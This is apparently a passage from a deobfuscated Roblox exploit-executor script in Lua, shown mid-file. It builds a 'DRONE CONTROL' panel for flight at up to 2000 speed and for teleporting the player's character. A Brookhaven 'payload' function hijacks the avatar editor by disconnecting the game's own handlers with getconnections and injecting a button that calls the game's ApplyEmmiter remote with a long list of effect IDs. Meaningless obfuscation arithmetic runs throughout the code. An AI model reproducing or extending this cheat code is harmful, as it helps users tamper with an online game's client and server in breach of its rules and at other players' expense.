				local v35 = table.pack(bit32.band(n17, 4294967295))
				local v36 = table.pack(bit32.band(n16, 4294967295))
				local v37 = table.pack(bit32.band(v35[1], 65535))
				local v38 = table.pack(bit32.rshift(v35[1], 16))
				local v39 = table.pack(bit32.band(v36[1], 65535))
				local v40 = bit32.band(v37[1] * v39[1] + bit32.lshift(bit32.band(v37[1] * bit32.rshift(v36[1], 16) + v38[1] * v39[1], 65535), 16), 4294967295)

				if keyCode == keyCode2.A then
					tbl2.L = 0
				else
					local n18 = n16 - 3005638809

					if input.KeyCode == Enum.KeyCode.D then
						tbl2.R = 0
					elseif input.KeyCode == Enum.KeyCode.E then
						tbl2.Q = 0
					else
						local keyCode3 = input.KeyCode
						local v41 = Enum

						if keyCode3 == v41.KeyCode.Q then
							tbl2.E = 0
						end
					end
				end
			end
		end)

		local connection4 = RunService.Heartbeat:Connect(fn9)
		local v35 = fn10

		fn10 = function()
			connection4:Disconnect()
			v35()
		end
	end

	local function fn12()
		local n13 = 498237290
		local n14 = 1231861302
		local n15 = 3635344100

		if connection3 then
			connection3:Disconnect()
			n15 = bit32.bor(n15, n14) + 4273994734
		end

		local v35 = bit32.bxor(n13, 487335138)
		flag = true
		vector_2 = Vector3.zero
		local v36 = table.pack(bit32.band(v35, 4294967295))
		local v37 = table.pack(bit32.band(v36[1], 65535))
		local n16 = bit32.band(45020 * v37[1] + bit32.lshift(bit32.band(45020 * bit32.rshift(v36[1], 16) + 2479 * v37[1], 65535), 16), 4294967295) + 806516676
		local v38 = table.pack(bit32.band(bit32.bor(v35, 425114455), 4294967295))
		local v39 = table.pack(bit32.band(v38[1], 65535))
		local v40 = bit32.band(41032 * v39[1] + bit32.lshift(bit32.band(41032 * bit32.rshift(v38[1], 16) + 60576 * v39[1], 65535), 16), 4294967295)
		local v41 = table.pack(bit32.band(bit32.bxor(v35, 425114455), 4294967295))
		local v42 = table.pack(bit32.band(v41[1], 65535))
		local n17 = n16 + v40 + bit32.band(45021 * v42[1] + bit32.lshift(bit32.band(45021 * bit32.rshift(v41[1], 16) + 2479 * v42[1], 65535), 16), 4294967295)
		vector_ = Vector3.zero
		local ControlModule = nil

		pcall(function()
			ControlModule = require(localPlayer.PlayerScripts:WaitForChild("PlayerModule"):WaitForChild("ControlModule"))
		end)

		local v43 = fn2()
		if not v43 then
			flag = false
			return
		end
		fn4(false)
		fn5(false)
		fn3()
		fn6()
		bodyVelocity = Instance.new("BodyVelocity")
		bodyVelocity.MaxForce = Vector3.new(9e9, 9e9, 9e9)
		bodyVelocity.Velocity = Vector3.zero
		bodyVelocity.Parent = v43
		bodyGyro = Instance.new("BodyGyro")
		bodyGyro.P = 5000
		bodyGyro.D = 500
		bodyGyro.MaxTorque = Vector3.new(9e9, 9e9, 9e9)
		bodyGyro.Parent = v43
		local renderStepped = RunService.RenderStepped
		local v44 = n15

		connection3 = renderStepped:Connect(function()
			local v45 = bit32.bxor(v44, 1253974977)
			local n18 = 2380224682

			if not flag then
				fn6()
				fn4(true)
				connection3:Disconnect()
				return
			end

			if not v43 or not v43.Parent then
				return
			end
			bodyGyro.CFrame = bodyGyro.CFrame:Lerp(currentCamera.CoordinateFrame, 0.2)

			if ControlModule then
				local moveVector = ControlModule:GetMoveVector()
				local n19 = n18 // 94
				local vector_3 = Vector3.zero
				local flag3 = false

				if moveVector.X ~= 0 then
					vector_3 = Vector3.zero + currentCamera.CFrame.RightVector * moveVector.X
					flag3 = true
				end

				if moveVector.Z ~= 0 then
					vector_3 -= currentCamera.CFrame.LookVector * moveVector.Z
					flag3 = true
				end

				vector_2 = flag3 and vector_3 * n9 or Vector3.zero
				vector_ = vector_:Lerp(vector_2, 0.3)
				bodyVelocity.Velocity = vector_
			end
		end)
	end

	fn10 = function()
		flag = false

		if connection then
			connection:Disconnect()
		end

		if connection2 then
			connection2:Disconnect()
		end

		if connection3 then
			connection3:Disconnect()
		end

		fn6()
		fn4(true)
	end

	local humanoid = nil

	local function fn13()
		humanoid = (localPlayer.Character or localPlayer.CharacterAdded:Wait()):WaitForChild("Humanoid")
		currentCamera.CameraType = Enum.CameraType.Custom
		local v35 = fn2()

		if v35 then
			currentCamera.CameraSubject = v35
		end
	end

	local function fn14()
		if humanoid then
			currentCamera.CameraType = Enum.CameraType.Custom
			currentCamera.CameraSubject = humanoid
		end
	end

	local color = Color3.fromRGB(10, 10, 10)
	local color2 = Color3.fromRGB
	local v35 = bit32.bxor(v34, 0)
	local v36 = bit32.band(v22, v35)
	local v37 = color2(18, 18, 18)
	local color3 = Color3.fromRGB(22, 22, 22)
	local color4 = Color3.fromRGB(130, 255, 100)
	local color5 = Color3.fromRGB(80, 200, 60)
	local color6 = Color3.fromRGB(40, 120, 30)
	local color7 = Color3.fromRGB(90, 160, 75)
	local color8 = Color3.fromRGB(55, 180, 40)
	local n13 = 252
	local v38 = Instance
	local v39 = bit32.bor(v33, 957280579)
	local v40 = bit32.bxor(v34, 93975849)
	local ScreenGui = v38.new("ScreenGui")
	ScreenGui.Name = "DronePanel"
	ScreenGui.ResetOnSpawn = false
	ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
	ScreenGui.Enabled = false
	ScreenGui.Parent = localPlayer:WaitForChild("PlayerGui")
	local frame = Instance.new("Frame")
	frame.Name = "Panel"
	local udim2 = UDim2.new
	local v41 = bit32.bxor(v40, 0)
	local v42 = bit32.bor(v36 + v39, v41)
	frame.Size = udim2(0, 172, 0, 0)
	local n14 = -n13
	frame.Position = UDim2.new(0.72, 0, 0.5, n14 / 2)
	frame.BackgroundColor3 = color
	frame.BorderSizePixel = 0
	frame.Active = true
	frame.Draggable = true
	frame.ClipsDescendants = true
	frame.Parent = ScreenGui

	local function fn15(arg, arg2, arg3, parent)
		local uiCorner = Instance.new("UICorner")
		uiCorner.CornerRadius = UDim.new(0, arg)
		uiCorner.Parent = parent
	end

	local function fn16(color9, thickness, transparency, arg, arg2, parent)
		local uiStroke = Instance.new("UIStroke")
		uiStroke.Color = color9
		uiStroke.Thickness = thickness
		uiStroke.Transparency = transparency
		uiStroke.Parent = parent
	end

	local v43 = table.pack(bit32.band(v39, 4294967295))
	local v44 = table.pack(bit32.band(v42, 4294967295))
	local v45 = table.pack(bit32.band(v43[1], 65535))
	local v46 = table.pack(bit32.rshift(v43[1], 16))
	local v47 = table.pack(bit32.band(v44[1], 65535))
	local v48 = bit32.band(v45[1] * v47[1] + bit32.lshift(bit32.band(v45[1] * bit32.rshift(v44[1], 16) + v46[1] * v47[1], 65535), 16), 4294967295)
	fn15(12, 474537531, 383570841, frame)
	fn16(color8, 1.5, 0.1, 368442239, 193698254, frame)
	local frame2 = Instance.new("Frame")
	local v49 = UDim2
	local v50 = bit32.bxor(v40, 81019881)
	frame2.Size = UDim2.new(1, 0, 0, 34)
	frame2.BackgroundColor3 = v37
	local v51 = bit32.rshift(v42, 24)
	frame2.BorderSizePixel = 0
	frame2.Parent = frame
	fn15(12, 474537531, 346974217, frame2)
	local frame3 = Instance.new("Frame")
	frame3.Size = UDim2.new(1, 0, 0.5, 0)
	local n15 = v48 - bit32.bxor(v50, 0)
	frame3.Position = UDim2.new(0, 0, 0.5, 0)
	frame3.BackgroundColor3 = v37
	frame3.BorderSizePixel = 0
	frame3.Parent = frame2
	local frame4 = Instance.new("Frame")
	frame4.Size = UDim2.new(1, 0, 0, 1)
	local v52 = UDim2
	local v53 = bit32.bxor(v50, 109114268)
	frame4.Position = UDim2.new(0, 0, 1, -1)
	frame4.BackgroundColor3 = color8
	frame4.BackgroundTransparency = 0.4
	frame4.BorderSizePixel = 0
	frame4.Parent = frame2
	local frame5 = Instance.new("Frame")
	local n16 = n15 * 3
	frame5.Size = UDim2.new(0, 7, 0, 7)
	frame5.Position = UDim2.new(0, 11, 0.5, -3)
	frame5.BackgroundColor3 = color4
	frame5.BorderSizePixel = 0
	frame5.Parent = frame2
	fn15(99, 474537531, 470440224, frame5)
	local v54 = Instance
	local v55 = table.pack(bit32.band(v51, 4294967295))
	local v56 = table.pack(bit32.band(n16, 4294967295))
	local v57 = table.pack(bit32.band(v55[1], 65535))
	local v58 = table.pack(bit32.rshift(v55[1], 16))
	local v59 = table.pack(bit32.band(v56[1], 65535))
	local v60 = bit32.band(v57[1] * v59[1] + bit32.lshift(bit32.band(v57[1] * bit32.rshift(v56[1], 16) + v58[1] * v59[1], 65535), 16), 4294967295)
	local v61 = bit32.bxor(v53, 280778390)
	local TextLabel = v54.new("TextLabel")
	TextLabel.Size = UDim2.new(1, -28, 1, 0)
	TextLabel.Position = UDim2.new(0, 24, 0, 0)
	TextLabel.BackgroundTransparency = 1
	TextLabel.Text = "DRONE CONTROL"
	TextLabel.TextColor3 = color4
	TextLabel.Font = Enum.Font.GothamBold
	TextLabel.TextSize = 12
	local left = Enum.TextXAlignment.Left
	local v62 = bit32.bxor(n16, v60)
	TextLabel.TextXAlignment = left
	TextLabel.Parent = frame2
	local frame6 = Instance.new("Frame")
	local v63 = bit32.rshift(v60, 4)
	frame6.Size = UDim2.new(1, -16, 1, -42)
	frame6.Position = UDim2.new(0, 8, 0, 38)
	local v64 = table.pack(bit32.band(v61, 4294967295))
	local v65 = table.pack(bit32.band(v64[1], 65535))
	local n17 = bit32.band(6653 * v65[1] + bit32.lshift(bit32.band(6653 * bit32.rshift(v64[1], 16) + 13499 * v65[1], 65535), 16), 4294967295) + 340028941
	local v66 = table.pack(bit32.band(bit32.bor(v61, 176003409), 4294967295))
	local v67 = table.pack(bit32.band(v66[1], 65535))
	local v68 = bit32.band(52230 * v67[1] + bit32.lshift(bit32.band(52230 * bit32.rshift(v66[1], 16) + 38537 * v67[1], 65535), 16), 4294967295)
	local v69 = table.pack(bit32.band(bit32.bxor(v61, 176003409), 4294967295))
	local v70 = table.pack(bit32.band(v69[1], 65535))
	local n18 = n17 + v68 + bit32.band(6654 * v70[1] + bit32.lshift(bit32.band(6654 * bit32.rshift(v69[1], 16) + 13499 * v70[1], 65535), 16), 4294967295)
	frame6.BackgroundTransparency = 1
	frame6.BorderSizePixel = 0
	frame6.Parent = frame
	local v71 = Instance
	local UIListLayout = v71.new("UIListLayout")
	UIListLayout.FillDirection = Enum.FillDirection.Vertical
	UIListLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center
	UIListLayout.SortOrder = Enum.SortOrder.LayoutOrder
	UIListLayout.Padding = UDim.new(0, 7)
	UIListLayout.Parent = frame6

	local function fn17(text)
		local textLabel = Instance.new("TextLabel")
		textLabel.Size = UDim2.new(1, 0, 0, 13)
		textLabel.BackgroundTransparency = 1
		textLabel.Text = text
		textLabel.TextColor3 = color7
		textLabel.Font = Enum.Font.GothamBold
		textLabel.TextSize = 9
		textLabel.TextXAlignment = Enum.TextXAlignment.Left
		textLabel.Parent = frame6
	end

	local function fn18()
		local frame7 = Instance.new("Frame")
		frame7.Size = UDim2.new(1, 0, 0, 1)
		frame7.BackgroundColor3 = color8
		frame7.BackgroundTransparency = 0.7
		frame7.BorderSizePixel = 0
		frame7.Parent = frame6
	end

	fn17("VELOCIDADE", 87071662, 254172230)
	fn18(474210547, 41141283)
	local v72 = Instance
	local v73 = bit32.bxor(n18, 338482613)
	local Frame = v72.new("Frame")
	Frame.Size = UDim2.new(1, 0, 0, 28)
	Frame.BackgroundColor3 = v37
	Frame.BorderSizePixel = 0
	local n19 = (v63 + 541691751) * 4
	Frame.Parent = frame6
	fn15(8, 474537531, 471606613, Frame)
	fn16(color8, 1, 0.6, 368442239, 22920644, Frame)
	local textLabel = Instance.new("TextLabel")
	local v74 = n19
	textLabel.Size = UDim2.new(1, 0, 1, 0)
	textLabel.BackgroundTransparency = 1
	textLabel.Text = tostring(n9)
	textLabel.TextColor3 = color4
	textLabel.Font = Enum.Font.GothamBold
	textLabel.TextSize = 17
	local center = Enum.TextXAlignment.Center
	local v75 = bit32.bxor(v73, 450558707)
	textLabel.TextXAlignment = center
	textLabel.Parent = Frame
	local frame7 = Instance.new("Frame")
	frame7.Size = UDim2.new(1, 0, 0, 26)
	local v76 = bit32.bxor(n19, 4294967295)
	frame7.BackgroundTransparency = 1
	frame7.Parent = frame6
	local uiListLayout = Instance.new("UIListLayout")
	uiListLayout.FillDirection = Enum.FillDirection.Horizontal
	local n20 = v74 + v76
	uiListLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center
	local center2 = Enum.VerticalAlignment.Center
	local v77 = bit32.bxor(v75, 96456333)
	uiListLayout.VerticalAlignment = center2
	uiListLayout.Padding = UDim.new(0, 6)
	uiListLayout.Parent = frame7

	local function createTextButton(text, parent, arg, arg2, arg3, arg4)
		local n21 = 179170796

		if not arg3 then
		end

		local textButton = Instance.new("TextButton")
		textButton.Size = UDim2.new(0, arg3, 0, 24)
		textButton.BackgroundColor3 = color3
		textButton.BorderSizePixel = 0
		textButton.Text = text
		textButton.TextColor3 = color4
		local font = Enum.Font
		local bxor = bit32.bxor
		local v78 = bit32.bxor(arg, 0)
		local v79 = bxor(2502532461, v78)
		textButton.Font = font.GothamBold
		textButton.TextSize = 11
		local v80 = table.pack(bit32.band(n21, 4294967295))
		local v81 = table.pack(bit32.band(v80[1], 65535))
		local n22 = 2147483647 + bit32.band(0 * v81[1] + bit32.lshift(bit32.band(0 * bit32.rshift(v80[1], 16) + 32768 * v81[1], 65535), 16), 4294967295)
		local v82 = bit32.bxor(n21, 98893680)
		local v83 = table.pack(bit32.band(bit32.bnot(v82), 4294967295))
		local v84 = table.pack(bit32.band(v83[1], 65535))
		local n23 = n22 + 0 + bit32.band(65535 * v84[1] + bit32.lshift(bit32.band(65535 * bit32.rshift(v83[1], 16) + 32767 * v84[1], 65535), 16), 4294967295)
		textButton.AutoButtonColor = false
		textButton.Parent = parent
		local v85 = fn15
		v85(7, 474537531, arg2, textButton)
		local v86 = fn16
		local v87 = bit32.bxor(n23, 402173815)
		v86(color8, 1, 0.45, 368442239, arg2, textButton)

		textButton.MouseEnter:Connect(function()
			TweenService:Create(textButton, TweenInfo.new(0.1), { BackgroundColor3 = Color3.fromRGB(20, 38, 14) }):Play()
		end)

		textButton.MouseLeave:Connect(function()
			local tbl2 = { BackgroundColor3 = color3 }
			TweenService:Create(textButton, TweenInfo.new(0.1), tbl2):Play()
		end)

		textButton.MouseButton1Click:Connect(arg4)
		return textButton
	end

	createTextButton("- 25", frame7, 303792716, 504746929, 68, function()
		n9 = math.max(25, n9 - 25)
		textLabel.Text = tostring(n9)
	end)

	createTextButton("+ 25", frame7, 303792716, 210242318, 68, function()
		n9 = math.min(2000, n9 + 25)
		textLabel.Text = tostring(n9)
	end)

	local frame8 = Instance.new("Frame")
	frame8.Size = UDim2.new(1, 0, 0, 24)
	local v78 = bit32.bxor(v77, 0)
	frame8.BackgroundTransparency = 1
	frame8.Parent = frame6
	local uiListLayout2 = Instance.new("UIListLayout")
	local v79 = Enum
	uiListLayout2.FillDirection = v79.FillDirection.Horizontal
	uiListLayout2.HorizontalAlignment = Enum.HorizontalAlignment.Center
	uiListLayout2.VerticalAlignment = Enum.VerticalAlignment.Center
	uiListLayout2.Padding = UDim.new(0, 5)
	uiListLayout2.Parent = frame8
	local textBox = Instance.new("TextBox")
	textBox.Size = UDim2.new(0, 96, 0, 22)
	textBox.BackgroundColor3 = v37
	textBox.BorderSizePixel = 0
	textBox.Text = ""
	textBox.PlaceholderText = "Speed..."
	local v80 = bit32.bxor(v77, 0)
	textBox.TextColor3 = color4
	textBox.PlaceholderColor3 = color6
	local gotham = Enum.Font.Gotham
	local v81 = bit32.bxor(v77, 455630088)
	textBox.Font = gotham
	textBox.TextSize = 11
	textBox.ClearTextOnFocus = true
	textBox.Parent = frame8
	local v82 = v80
	fn15(6, 474537531, 86964696, textBox)
	fn16(color8, 1, 0.5, 368442239, 217903001, textBox)
	local textButton = Instance.new("TextButton")
	local v83 = UDim2
	local v84 = bit32.bxor(v81, 0)
	local v85 = bit32.bxor(v80, v84)
	textButton.Size = UDim2.new(0, 42, 0, 22)
	textButton.BackgroundColor3 = color5
	textButton.BackgroundTransparency = 0.2
	textButton.BorderSizePixel = 0
	textButton.Text = "Active"
	textButton.TextColor3 = color
	textButton.Font = Enum.Font.GothamBold
	textButton.TextSize = 11
	textButton.AutoButtonColor = false
	textButton.Parent = frame8
	local v86 = bit32.bxor(v81, 160668462)
	fn15(6, 474537531, 348087789, textButton)
	local v87 = bit32.rshift(v82, 12)
	fn16(color4, 1, 0.3, 368442239, 324499353, textButton)

	local function fn19()
		local num = tonumber(textBox.Text)

		if num then
			n9 = math.clamp(num, 10, 2000)
			textLabel.Text = tostring(n9)
			textBox.Text = ""
		end
	end

	textButton.MouseButton1Click:Connect(fn19)
	local n21 = bit32.bxor(v86, 237955737) + 3526029255
	local v88 = table.pack(bit32.band(n14, 4294967295))
	local v89 = table.pack(bit32.band(v88[1], 65535))
	local v90 = bit32.band(61383 * v89[1] + bit32.lshift(bit32.band(61383 * bit32.rshift(v88[1], 16) + 53802 * v89[1], 65535), 16), 4294967295)
	local v91 = table.pack(bit32.band(bit32.bnot(n14), 4294967295))
	local v92 = table.pack(bit32.band(v91[1], 65535))
	local n22 = n21 + v90 + bit32.band(61383 * v92[1] + bit32.lshift(bit32.band(61383 * bit32.rshift(v91[1], 16) + 53802 * v92[1], 65535), 16), 4294967295)
	fn18(228756010, 41141283)
	fn17("TELEPORTE", 64450154, 254172230)
	fn18(188535441, 41141283)

	createTextButton("IR AO DRONE", frame6, 303792716, 425546739, 156, function()
		local character2 = localPlayer.Character
		character2 = character2 and character2:FindFirstChild("HumanoidRootPart")
		local v93 = fn2()

		if character2 and v93 then
			character2.CFrame = v93.CFrame + Vector3.new(0, 5, 0)
		end
	end)

	local flag3 = true
	local n23 = 0
	local heartbeat = RunService.Heartbeat
	local v93 = bit32.band(v87, 4007353880)

	heartbeat:Connect(function(arg)
		if not ScreenGui.Enabled then
			return
		end
		n23 += arg
	end)

	local function fn20()
		ScreenGui.Enabled = true
		frame.Size = UDim2.new(0, 172, 0, 0)
		frame.Position = UDim2.new(0.72, 0, 0.5, -n13 / 2)
		TweenService:Create(frame, TweenInfo.new(0.32, Enum.EasingStyle.Back, Enum.EasingDirection.Out), { Size = UDim2.new(0, 172, 0, 252) }):Play()
	end

	local function fn21()
		local flag4 = type(145781057) == "userdata"
		TweenService:Create(frame, TweenInfo.new(0.2, Enum.EasingStyle.Quad, Enum.EasingDirection.In), { Size = UDim2.new(0, 172, 0, 0) }):Play()
		local n24 = 4533712071

		task.delay(0.22, function()
			ScreenGui.Enabled = false
		end)
	end

	local tool = Instance.new("Tool")
	tool.Name = ""
	tool.RequiresHandle = false
	tool.CanBeDropped = false
	tool.TextureId = "rbxassetid://128206730917756"

	local function fn22()
		if #fn() == 0 then
			drone.ChildAdded:Wait()
		end

		return #fn() > 0
	end

	tool.Equipped:Connect(function()
		if not fn22() then
			return
		end
		fn7()
		fn13()
		fn20()

		if flag2 then
			fn12()
		else
			fn11()
		end
	end)

	tool.Unequipped:Connect(function()
		fn10()
		fn14()
		fn8()
		fn21()
	end)

	tool.Parent = localPlayer:WaitForChild("Backpack")
end

-- payload closure created 263-th (proto #185)
local function payload_fn_263()
	local n2 = 282669322
	local Players = game:GetService("Players")
	local ReplicatedStorage = game:GetService("ReplicatedStorage")
	local n3 = 606161968
	local localPlayer = Players.LocalPlayer
	local avatarEditorMenu = localPlayer:WaitForChild("PlayerGui"):WaitForChild("NoResetGUIHandler"):WaitForChild("AvatarEditorHolder"):WaitForChild("AvatarEditorMenu")
	local catalog = avatarEditorMenu:WaitForChild("Catalog")
	local container = catalog:WaitForChild("Container")
	local subCategoryTabs = catalog:WaitForChild("SubCategoryTabs")
	local body = subCategoryTabs:WaitForChild("Body")
	local n4 = 0
	local n5 = 456122231
	local v = table.pack(bit32.band(n5, 4294967295))
	local v2 = table.pack(bit32.band(v[1], 65535))
	local n6 = 4295209464 + bit32.band(13546 * v2[1] + bit32.lshift(bit32.band(13546 * bit32.rshift(v[1], 16) + 56625 * v2[1], 65535), 16), 4294967295) + 4281754984
	local emmiters = body:WaitForChild("Emmiters")
	local scale = body:WaitForChild("Scale")
	local close = catalog.CategoryTabs:WaitForChild("Close")
	local applyEmmiter = ReplicatedStorage:WaitForChild("Remotes"):WaitForChild("ApplyEmmiter")
	local n7 = 3884135063 * n4
	local genv = getgenv() or _G

	if type(genv.__BrookhavenEffectsCleanup) == "function" then
		pcall(genv.__BrookhavenEffectsCleanup)
	end

	local function fn(arg, arg2, arg3)
		local ok2, result2 = pcall(getconnections, arg3.Activated)
		if not ok2 or type(result2) ~= "table" then
			return
		end

		for _, v3 in ipairs(result2) do
			local v4 = nil

			if v3.Function and debug and debug.info then
				local n8 = 89802889

				pcall(function()
					v4 = debug.info(v3.Function, "s")
				end)
			end

			if v4 == "" then
				local v5 = pcall
				local v6 = table.pack(bit32.band(arg2, 4294967295))
				local v7 = table.pack(bit32.band(v6[1], 65535))
				local v8 = bit32.band(17514 * v7[1] + bit32.lshift(bit32.band(17514 * bit32.rshift(v6[1], 16) + 25362 * v7[1], 65535), 16), 4294967295)
				local v9 = table.pack(bit32.band(bit32.bnot(arg2), 4294967295))
				local v10 = table.pack(bit32.band(v9[1], 65535))
				local n8 = 2603111821 + v8 + bit32.band(17514 * v10[1] + bit32.lshift(bit32.band(17514 * bit32.rshift(v9[1], 16) + 25362 * v10[1], 65535), 16), 4294967295)

				v5(function()
					v3:Disconnect()
				end)
			end
		end
	end

	for _, child in ipairs(catalog.CategoryTabs:GetChildren()) do
		if child:IsA("ImageButton") then
			fn(30712830, 514998426, child)
		end
	end

	for _, descendant in ipairs(subCategoryTabs:GetDescendants()) do
		if descendant:IsA("ImageButton") then
			fn(30712830, 131936884, descendant)
		end
	end

	local coquetteEffectsButton = body:FindFirstChild("CoquetteEffectsButton")

	if coquetteEffectsButton then
		coquetteEffectsButton:Destroy()
	end

	local coquetteEffectsContent = container:FindFirstChild("CoquetteEffectsContent")

	if coquetteEffectsContent then
		coquetteEffectsContent:Destroy()
	end

	local tbl = {}
	local tbl2 = {}
	local v3 = bit32.rshift(n4, 24)
	tbl2[1] = "Corações Roxos"
	tbl2[2] = "18635723426"
	tbl2[3] = "004HeartsPurple"
	local n8 = n7 * v3 - 2191905063
	local v4 = bit32.bxor(n6, 500564103)
	local v5 = bit32.bxor(v3, 4294967295)
	local tbl3 = {}
	local v6 = bit32.bxor(v4, 382102350)
	tbl3[1] = "Fogo Laranja"
	tbl3[2] = "18637025451"
	tbl3[3] = "031FireOrange"
	local tbl4 = {}
	local v7 = bit32.bxor(v6, 390178713)
	tbl4[1] = "Faíscas Azuis"
	tbl4[2] = "18637386856"
	tbl4[3] = "052SparksBlue"
	local tbl5 = {}
	tbl5[1] = "Faíscas Roxas"
	tbl5[2] = "18637442447"
	tbl5[3] = "053SparksPurple"
	local tbl6 = {}
	local v8 = bit32.bxor(v5 // 3, 2962795858)
	tbl6[1] = "Bolhas Azuis"
	tbl6[2] = "18637499282"
	tbl6[3] = "062BubbleBlue"
	local tbl7 = {}
	local v9 = bit32.bor(n8 * 2, v8)
	tbl7[1] = "Bolhas Vermelhas"
	tbl7[2] = "18637500927"
	tbl7[3] = "064BubbleRed"
	local tbl8 = {}
	local v10 = bit32.bxor(v7, 316647853)
	tbl8[1] = "Música Azul"
	tbl8[2] = "18637680960"
	tbl8[3] = "072MusicBlue"
	local tbl9 = {}
	local v11 = bit32.bxor(v10, 0)
	local v12 = bit32.bor(v9, v11)
	tbl9[1] = "Fumaça Verde"
	tbl9[2] = "18637789299"
	tbl9[3] = "083SmokeGreen"
	local v13 = table.pack(bit32.band(v11, 4294967295))
	local v14 = table.pack(bit32.band(v13[1], 65535))
	local v15 = bit32.band(33014 * v14[1] + bit32.lshift(bit32.band(33014 * bit32.rshift(v13[1], 16) + 57491 * v14[1], 65535), 16), 4294967295)
	local v16 = table.pack(bit32.band(bit32.bnot(v11), 4294967295))
	local v17 = table.pack(bit32.band(v16[1], 65535))
	local n9 = 3817585198 + n3 + v15 + bit32.band(33014 * v17[1] + bit32.lshift(bit32.band(33014 * bit32.rshift(v16[1], 16) + 57491 * v17[1], 65535), 16), 4294967295)
	local v18 = bit32.bxor(v8, 455822644)
	local tbl10 = {}
	local v19 = bit32.bxor(v10, 42183626)
	tbl10[1] = "Estrela Laranja"
	tbl10[2] = "18637946172"
	tbl10[3] = "091StarOrange"
	local tbl11 = {}
	local v20 = bit32.bxor(v12, 1247467395)
	tbl11[1] = "Estrela Azul"
	tbl11[2] = "18637940338"
	tbl11[3] = "093StarBlue"
	tbl[1] = { "Corações Amarelos", "18635672195", "001HeartsYellow" }
	tbl[2] = { "Corações Verdes", "18635727693", "002HeartsGreen" }
	tbl[3] = { "Corações Azuis", "18635732186", "003HeartsBlue" }
	tbl[4] = tbl2
	tbl[5] = { "Corações Rosas", "18635726250", "005HeartsPink" }
	tbl[6] = { "Corações Vermelhos", "18635729673", "006HeartsRed" }
	tbl[7] = { "Pontos Laranjas", "18637252424", "010DotsOrange" }
	tbl[8] = { "Pontos Amarelos", "18637263004", "011DotsYellow" }
	tbl[9] = { "Pontos Verdes", "18637265264", "013DotsGreen" }
	tbl[10] = { "Pontos Azuis", "18637256859", "014DotsBlue" }
	tbl[11] = { "Pontos Roxos", "18637261058", "015DotsPurple" }
	tbl[12] = { "Pontos Rosas", "18637259328", "016DotsPink" }
	tbl[13] = { "Pontos Vermelhos", "18637267290", "017DotsRed" }
	tbl[14] = { "Brilho Branco", "18637115654", "020TwinkleWhite" }
	tbl[15] = { "Brilho Amarelo", "18637118923", "021TwinkleYellow" }
	tbl[16] = { "Brilho Verde", "18637151114", "022TwinkleGreen" }
	tbl[17] = { "Brilho Roxo", "18637153880", "023TwinklePurple" }
	tbl[18] = { "Brilho Rosa", "18637157071", "024TwinklePink" }
	tbl[19] = { "Brilho Vermelho", "18637155247", "025TwinkleRed" }
	tbl[20] = { "Fogo Branco", "18637074370", "030FireWhite" }
	tbl[21] = tbl3
	tbl[22] = { "Fogo Verde", "18637078598", "032FireGreen" }
	tbl[23] = { "Fogo Azul", "18637076370", "033FireBlue" }
	tbl[24] = { "Fogo Roxo", "18637070174", "034FirePurple" }
	tbl[25] = { "Fogo Preto", "18637072603", "035FireBlack" }
	tbl[26] = { "Corações Pequenos Amarelos", "18637339451", "040SmallHeartsYellow" }
	tbl[27] = { "Corações Pequenos Verdes", "18637337576", "041SmallHeartsGreen" }
	tbl[28] = { "Corações Pequenos Azuis", "18637345162", "042SmallHeartsBlue" }
	tbl[29] = { "Corações Pequenos Roxos", "18637335865", "043SmallHeartsPurple" }
	tbl[30] = { "Corações Pequenos Rosas", "18637343416", "044SmallHeartsPink" }
	tbl[31] = { "Corações Pequenos Vermelhos", "18637341847", "045SmallHeartsRed" }
	tbl[32] = { "Faíscas Brancas", "18637383085", "050SparksWhite" }
	tbl[33] = { "Faíscas Verdes", "18637385236", "051SparksGreen" }
	tbl[34] = tbl4
	tbl[35] = tbl5
	tbl[36] = { "Faíscas Rosas", "18637445897", "054SparksPink" }
	tbl[37] = { "Faíscas Vermelhas", "18637447550", "055SparksRed" }
	tbl[38] = { "Bolhas Verdes", "18637493072", "061BubbleGreen" }
	tbl[39] = tbl6
	tbl[40] = { "Bolhas Roxas", "18637497343", "063BubblePurple" }
	tbl[41] = tbl7
	tbl[42] = { "Música Branca", "18637675173", "070MusicWhite" }
	tbl[43] = { "Música Verde", "18637677789", "071MusicGreen" }
	tbl[44] = tbl8
	tbl[45] = { "Música Roxa", "18637679384", "073MusicPurple" }
	tbl[46] = { "Música Vermelha", "18637672698", "074MusicRed" }
	tbl[47] = { "Fumaça Branca", "18637791748", "080SmokeWhite" }
	tbl[48] = { "Fumaça Amarela", "18637800482", "081SmokeYellow" }
	tbl[49] = { "Fumaça Laranja", "18637793920", "082SmokeOrange" }
	tbl[50] = tbl9
	tbl[51] = { "Fumaça Azul", "18637803021", "084SmokeBlue" }
	tbl[52] = { "Fumaça Roxa", "18637813360", "085SmokePurple" }
	tbl[53] = { "Fumaça Vermelha", "18637796598", "086SmokeRed" }
	tbl[54] = { "Fumaça Preta", "18637798529", "087SmokeBlack" }
	tbl[55] = { "Estrela Branca", "18637942956", "090StarWhite" }
	tbl[56] = tbl10
	tbl[57] = { "Estrela Verde", "18637934500", "092StarGreen" }
	tbl[58] = tbl11
	tbl[59] = { "Estrela Roxa", "18637944796", "094StarPurple" }
	tbl[60] = { "Estrela Rosa", "18637947820", "095StarPink" }
	tbl[61] = { "Estrela Vermelha", "18637949457", "096StarRed" }
	emmiters.LayoutOrder = 8
	scale.LayoutOrder = 10
	local clone = emmiters:Clone()
	clone.Name = "CoquetteEffectsButton"
	clone.LayoutOrder = 9
	clone.Visible = true
	clone.Parent = body
	clone.Icon.Image = emmiters.Icon.Image
	local v21 = table.pack(bit32.band(v19, 4294967295))
	local v22 = table.pack(bit32.band(v21[1], 65535))
	local n10 = bit32.band(63760 * v22[1] + bit32.lshift(bit32.band(63760 * bit32.rshift(v21[1], 16) + 796 * v22[1], 65535), 16), 4294967295) + 863418048
	local v23 = table.pack(bit32.band(bit32.bor(v19, 26318508), 4294967295))
	local v24 = table.pack(bit32.band(v23[1], 65535))
	local v25 = bit32.band(1777 * v24[1] + bit32.lshift(bit32.band(1777 * bit32.rshift(v23[1], 16) + 64739 * v24[1], 65535), 16), 4294967295)
	local v26 = table.pack(bit32.band(bit32.band(v19, 26318508), 4294967295))
	local v27 = table.pack(bit32.band(v26[1], 65535))
	local n11 = v25 + bit32.band(1775 * v27[1] + bit32.lshift(bit32.band(1775 * bit32.rshift(v26[1], 16) + 64739 * v27[1], 65535), 16), 4294967295)
	local v28 = bit32.rshift(v20, 17)
	local n12 = n10 + n11
